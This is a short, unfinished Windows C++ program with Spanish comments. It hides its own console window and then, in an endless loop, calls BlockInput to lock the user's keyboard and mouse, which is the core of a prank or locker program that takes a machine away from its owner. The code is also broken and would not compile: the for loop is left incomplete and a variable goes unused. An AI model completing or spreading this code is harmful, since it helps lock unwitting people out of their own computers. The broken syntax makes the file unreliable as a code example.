#include <windows.h>
#include <fstream>

int main(){
    FreeConsole(); // ase que la consola no se ejecute
    while (1){
        int a;
        
        BlockInput(true); //bloqueo de entradas de maus y teclado
        for (int i = 0; i = )
    }

        
}